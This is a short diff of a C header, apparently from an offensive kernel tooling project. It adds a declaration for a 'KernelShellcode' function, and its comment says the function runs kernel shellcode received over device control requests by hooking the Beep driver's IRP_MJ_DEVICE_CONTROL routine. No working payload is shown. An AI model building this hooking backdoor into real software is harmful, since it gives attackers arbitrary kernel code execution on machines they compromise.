@@ -10,14 +10,15 @@
  *
 **/
 
-#include "common.h"
+#pragma once
 
 /**
  *
  * Purpose:
  *
- * Executes the provided shellcode in kernel
- * memory as PASSIVE_LEVEL when sent via 
- * device control request.
+ * Executes a kernel shellcode over a device
+ * control request. Acts as a hook on Beep's
+ * IRP_MJ_DEVICE_CONTROL routine
  *
 **/
+D_SEC( C ) NTSTATUS NTAPI KernelShellcode( _In_ PDRIVER_OBJECT Driver, _In_ PVOID Irp );
